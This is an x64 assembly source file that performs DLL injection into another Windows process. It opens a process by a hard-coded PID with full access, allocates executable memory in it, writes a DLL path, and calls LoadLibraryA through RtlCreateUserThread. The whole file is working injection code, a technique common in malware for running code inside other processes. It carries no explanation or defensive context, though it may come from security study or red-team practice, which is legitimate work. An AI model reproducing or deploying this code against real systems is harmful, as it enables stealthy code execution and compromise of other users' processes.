; windows_injection_rtlcreateuserthread.asm

extrn ExitProcess :PROC
extrn OpenProcess :PROC
extrn VirtualAllocEx :PROC
extrn WriteProcessMemory :PROC
extrn GetModuleHandleA :PROC
extrn GetProcAddress :PROC

.data 
    dllPath                     DB "C:\Users\User\Desktop\windows_create_dll_64.dll", 0
    sKrnl32                     DB "kernel32.dll", 0
    sNtdll                      DB "ntdll.dll", 0
    sLoadLib                    DB "LoadLibraryA", 0
    sRtlCreateUserThread        DB "RtlCreateUserThread", 0
    PID                         DQ 3440

    hProcess                    DQ ?
    nSizeDLL                    DQ ?
    baseAddr                    DQ ?
    hKrnl32Addr                 DQ ?
    hLoadLibAddr                DQ ?
    hRtlCreateUserThreadAddr    DQ ?
    hNtdllAddr                  DQ ?
    hThread                     DQ ?

.code
Start PROC
    SUB     rsp, 28h

    ; OpenProcess()
    MOV     rcx, 1F0FFFh
    XOR     rdx, rdx
    MOV     r8, PID
    CALL    OpenProcess
    CMP     rax, 0
    JZ      _exit
    MOV     hProcess, rax

    ; VirtualAllocEx()
    SUB     rsp, 28h
    MOV     rcx, hProcess
    XOR     rdx, rdx
    MOV     r8, SIZEOF dllPath
    MOV     r9, 3000h
    MOV     qword ptr [rsp+32], 40h
    CALL    VirtualAllocEx
    ADD     rsp, 28h
    CMP     rax, 0
    JZ      _exit
    MOV     [baseAddr], rax
    
    ; WriteProcessMemory()
    SUB     rsp, 28h
    MOV     rcx, hProcess
    MOV     rdx, baseAddr
    LEA     r8, dllPath
    MOV     r9, SIZEOF dllPath
    XOR     rax, rax
    MOV     qword ptr [rsp+32], rax
    CALL    WriteProcessMemory
    ADD     rsp, 28h
    CMP     rax, 0
    JZ      _exit

    ; GetModuleHandle()
    LEA     rcx, sKrnl32
    CALL    GetModuleHandleA
    CMP     rax, 0
    JZ      _exit
    MOV     hKrnl32Addr, rax

    ; GetProcAddress() -> LoadLibraryA()
    MOV     rcx, hKrnl32Addr
    LEA     rdx, sLoadLib
    CALL    GetProcAddress
    CMP     rax, 0
    JZ      _exit
    MOV     hLoadLibAddr, rax

    ; GetModuleHandle() -> ntdll
    LEA     rcx, sNtdll
    CALL    GetModuleHandleA
    CMP     rax, 0
    JZ      _exit
    MOV     hNtdllAddr, rax

    ; GetProcAddress() -> RtlCreateUserThread
    MOV     rcx, hNtdllAddr
    LEA     rdx, sRtlCreateUserThread
    CALL    GetProcAddress
    CMP     rax, 0
    JZ      _exit
    MOV     hRtlCreateUserThreadAddr, rax

    ; RtlCreateUserThread()
    SUB     rsp, 50h
    MOV     rcx, hProcess
    XOR     rdx, rdx
    XOR     r8, r8
    XOR     r9, r9
    XOR     rax, rax
    MOV     qword ptr [rsp+48h], rax
    LEA     rax, hThread
    MOV     qword ptr [rsp+40h], rax
    MOV     rax, baseAddr
    MOV     qword ptr [rsp+38h], rax
    MOV     rax, hLoadLibAddr
    MOV     qword ptr [rsp+30h], rax
    XOR     rax, rax
    MOV     qword ptr [rsp+28h], rax
    MOV     qword ptr [rsp+20h], rax
    MOV     rax, hRtlCreateUserThreadAddr
    CALL    rax
    ADD     rsp, 50h

_exit:
    XOR     rcx, rcx
    CALL    ExitProcess
Start ENDP
END 